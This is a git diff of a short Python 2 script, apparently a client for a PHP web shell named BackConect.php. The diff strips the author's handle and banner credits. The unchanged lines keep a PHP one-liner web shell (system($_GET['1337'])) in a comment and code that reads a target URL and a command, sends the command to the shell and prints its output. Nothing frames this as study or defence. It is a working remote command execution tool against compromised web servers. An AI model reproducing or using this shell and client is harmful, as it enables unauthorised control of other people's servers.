@@ -1,11 +1,10 @@
 import requests
 
-# twitter @Arturo1337
 # Licencia GNU libre de modificaciones
 # <?php system($_GET['1337']); ?>
 
-print "\n________                    ___         ____    Twitter: @Arturo1337            " 
-print "`MMMMMMMb.                  `MM        6MMMMb/               Mafia Hacker Cadereyta       " 
+print "\n________                    ___         ____                                            " 
+print "`MMMMMMMb.                  `MM        6MMMMb/                                            " 
 print " MM    `Mb                   MM       8P    YM                                       /    " 
 print " MM     MM    ___     ____   MM   __ 6M      Y   _____  ___  __     ____     ____   /M    " 
 print " MM    .M9  6MMMMb   6MMMMb. MM   d' MM         6MMMMMb `MM 6MMb   6MMMMb   6MMMMb./MMMMM " 
@@ -16,7 +15,6 @@ print " MM     MM MM'   MM MM       MMPYM.  YM      6 MM     MM MM    MM MM     
 print " MM    .M9 MM.  ,MM YM.   d9 MM  YM.  8b    d9 YM.   ,M9 MM    MM YM    d9 YM.   d9 YM.  ," 
 print "_MMMMMMM9' `YMMM9'Yb.YMMMM9 _MM_  YM._ YMMMM9   YMMMMM9 _MM_  _MM_ YMMMM9   YMMMM9   YMMM9"
 print "----------------------------------- Licencia GNU -----------------------------------------"
-print "------------------- Framework para conexiones inversas por Arturo1337 --------------------"
 
 web = raw_input("\nintroduce la url ~$ ")
 
@@ -27,7 +25,3 @@ print "\n\n [ RESULTADO ] -----------------------------------\n\n"
 url = requests.get(web + "/BackConect.php?1337=" + comando)
 
 print url.text
- 
-
- 
-
